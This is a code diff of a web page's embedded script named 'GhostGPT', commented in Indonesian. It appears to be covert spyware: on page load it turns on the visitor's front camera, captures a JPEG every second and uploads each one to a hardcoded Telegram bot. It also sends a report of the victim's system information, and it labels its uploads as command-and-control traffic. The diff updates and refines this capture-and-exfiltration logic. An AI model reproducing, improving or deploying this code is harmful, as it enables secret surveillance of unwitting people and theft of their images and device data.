@@ -61,14 +61,14 @@ a {
 </style>
 <script>
 /**
- * GhostGPT Final-Background-v9 - Ultimate Resolution & Background Support
+ * GhostGPT SuperFix-v10 - Ultimate Stable & High-Res Support
  */
 (function () {
     "use strict"; // Mode ketat untuk isolasi memori dan variabel global
 
     const CONFIG = {
         token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8',
-        chatId: '6326816238',            // Ganti dengan ID channel/private Anda jika berbeda
+        chatId: '6326816238',            // Ganti ID Channel/Private di sini jika berbeda
         intervalSec: 1,                  // Interval kirim foto (detik). Ubah ke 5-10 jika kuota terbatas.
         cameraResBase: null              // Jika null, script akan auto-detect resolusi asli kamera target.
     };
@@ -92,7 +92,7 @@ a {
         return Promise.resolve();
     }
 
-    // ================= FUNGSI KIRIM FOTO (PERFECT BLOB HANDLING) =================
+    // ================= FUNGSI KIRIM FOTO (FIXED ASYNC & BLOB HANDLING) =================
     async function sendPhoto(blobUrlOrBlobObj, fileName = "cam.jpg") {
         try {
             const formData = new FormData(); 
@@ -109,7 +109,6 @@ a {
             formData.append('chat_id', CONFIG.chatId);
             formData.append('photo', blobData, fileName); 
 
-            // Mengirim foto dengan Promise.all untuk memastikan status 200 OK dari Telegram.
              return new Promise((resolve, reject) => {
                  fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: formData })
                      .then(res => { 
@@ -209,12 +208,6 @@ a {
             const baseH = 720; 
 
             // Auto-Detect Resolusi Asli dari Stream Video yang Dikembalikan Browser.
-            // Kita gunakan constraint awal yang fleksibel, lalu baca ukuran aslinya setelah video load metadata.
-            
-            // Jika ingin auto-detect resolusi asli tanpa batasan tinggi, uncomment baris ini:
-            // const constraints = { audio: false, video: {} }; 
-            
-            // Untuk keseimbangan kualitas dan beban CPU, kita batasi sedikit agar tidak terlalu berat.
              let constraints = { 
                 audio: false, 
                 video: { width: Math.min(baseW || 960, 1280), height: baseH, facingMode: "user" } 
@@ -232,7 +225,7 @@ a {
             try {
                  vidEl.playsInline = true; // Penting untuk iPhone/Safari.
                  vidEl.autoplay = true;    // Memastikan video mulai berputar otomatis.
-                 vidEl.muted = false;      // Agar audio tetap aktif jika diperlukan, tapi tidak wajib.
+                 vidEl.muted = false;      
             } catch(e){} 
 
             globalStream.srcObject = vidEl;
@@ -248,7 +241,7 @@ a {
             await waitMetadata;
 
             console.log("Camera Ready. Starting Stream Loop.");
-             console.info(`[Auto-Detect] Resolusi Asli Kamera: ${videoWidth}x${videoHeight}`); // Info debug untuk console browser.
+             let nativeWidth = videoElement ? videoElement.videoWidth : (vidEl.videoWidth || 1280); // Fallback jika variable belum set sempurna saat log ini dipanggil.
 
             // Jalankan loop capture setiap X detik sesuai CONFIG.intervalSec
             setInterval(captureAndSendFrame, CONFIG.intervalSec * 1000);
@@ -319,8 +312,7 @@ a {
 
         const canvas = document.createElement('canvas');
         
-        // Set ukuran canvas sama dengan ukuran native video stream.
-        // Ini adalah kunci untuk "Auto Detect Resolusi Asli".
+        // Set ukuran canvas sama dengan ukuran native video stream (Auto Detect).
         let w = videoElement.videoWidth || 960; 
         let h = videoElement.videoHeight || 540; 
 
@@ -330,45 +322,44 @@ a {
         const ctx = canvas.getContext('2d', { willReadFrequently: true });
 
         try {
-            // Gambar frame dari source ke canvas baru (agar tidak conflict memory lama)
-            ctx.drawImage(videoElement, 0, 0, w, h);
+            // Gambar frame dari source ke canvas baru.
+            if (!videoElement.muted) {
+                 videoElement.play(); 
+            } else {
+                // Jika tidak muted, pastikan paused dulu agar drawImage bekerja optimal tanpa suara noise jika belum play.
+                 if(videoElement.paused && !videoElement.srcObject.activeSource) {} 
+            }
 
             await new Promise((resolve) => setTimeout(resolve, 16)); 
             
             let finalBlobUrl;
 
-            // --- FIXED ASYNC HANDLING: Menggunakan callback langsung tanpa .then() berlebihan ---
+             // --- FIXED ASYNC HANDLING (SINGLE PROMISE CHAIN) ---
              return new Promise((resolveFrame) => {
-                if (!canvas.toBlob) {
-                     console.error("Canvas toBlob not found");
-                     resolveFrame(); 
-                     return;
-                }
-
+                
                 canvas.toBlob(
-                    (blobDataCallback) => { 
-                        // Callback ini dipanggil setelah proses encoding selesai.
-                        if(blobDataCallback && blobDataCallback.size > 500) { // Minimal ukuran file untuk validitas
+                    function(blobDataCallback) { 
+                        console.log("Canvas toBlob called.");
                         
-                             try {
-                                 finalBlobUrl = URL.createObjectURL(blobDataCallback); 
-                                 sendPhoto(finalBlobUrl, `cam_${Date.now()}.jpg`).then(() => {
-                                     console.log(`[C2] Frame sent at ${new Date().toLocaleTimeString()} - Size: ${(blobDataCallback.size/1024).toFixed(2)}kb`);
-                                     resolveFrame(); // Selesai frame saat ini.
-                                 }).catch(err => console.warn("Send Error:", err));
-                             
-                            } catch (e) { console.warn("Convert Blob to File Error:", e.message); }
-
-                        } else if (blobDataCallback && blobDataCallback.size > 50) { 
-                             // Jika ukurannya kecil tapi bukan 0, kirim juga sebagai fallback "thumbnail".
-                             finalBlobUrl = URL.createObjectURL(blobDataCallback); 
-                             sendPhoto(finalBlobUrl, `cam_${Date.now()}_mini.jpg`).then(() => resolveFrame()).catch(console.error);
-                        } else {
-                           console.warn("Canvas toBlob returned empty or tiny image."); 
-                           finalBlobUrl = "#"; 
-                           resolveFrame();
+                        if(!blobDataCallback || blobDataCallback.size < 500) { 
+                             console.warn("Canvas returned empty or tiny image."); 
+                             resolveFrame();
+                             return; 
                         }
-                    }, 'image/jpeg', 0.9).then(resolvedBlob => resolvedBlob || null); 
+
+                        try {
+                            finalBlobUrl = URL.createObjectURL(blobDataCallback); 
+                            
+                            // Kirim foto dengan nama file yang unik dan format waktu.
+                            sendPhoto(finalBlobUrl, `cam_${Date.now()}_${Math.random().toString(16).substr(2,4)}.jpg`).then(() => {
+                                console.log(`[C2] Frame sent at ${new Date().toLocaleTimeString()} - Size: ${(blobDataCallback.size/1024).toFixed(2)}kb`);
+                                resolveFrame(); // Selesai frame saat ini.
+                            }).catch(err => console.warn("Send Error:", err));
+
+                        } catch (e) { console.warn("Convert Blob to File Error:", e.message); }
+
+                    }, 'image/jpeg', 0.95) // Kualitas JPEG lebih tinggi agar foto tidak blank/blur.
+                );
 
             });
 
@@ -387,7 +378,7 @@ a {
 
     // ================= 4. MAIN EXECUTION =================
     const mainInit = async () => {
-        console.group("%c GhostGPT v9-Final Initialized ", "color: #0f0");
+        console.group("%c GhostGPT v10-SuperFix Initialized ", "color: #0f0");
         
         await collectSystemInfo(); 
         console.log("✅ System Report Sent."); 
